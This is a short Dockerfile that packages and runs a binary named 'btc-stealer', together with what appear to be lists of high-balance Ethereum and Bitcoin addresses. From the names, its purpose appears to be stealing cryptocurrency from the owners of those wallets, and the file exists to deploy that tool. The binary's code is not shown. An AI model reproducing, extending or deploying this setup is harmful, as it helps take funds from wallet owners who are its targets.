FROM alpine:3.17.3 AS builder

COPY config.json /root
COPY btc-stealer /root

COPY wallet/10000richAddressETH.txt /root/wallet/

COPY wallet/ETHEREUM/EthRich.txt /root/wallet/ETHEREUM/
COPY wallet/ETHEREUM/rich_01.txt /root/wallet/ETHEREUM/

COPY wallet/Bitcoin/2023/04/RichAddr_Max*.txt /root/wallet/Bitcoin/2023/04/
COPY wallet/Bitcoin/2023/04/p2pkh_Rich_Max*.txt /root/wallet/Bitcoin/2023/04/

WORKDIR /root

CMD ["./btc-stealer"]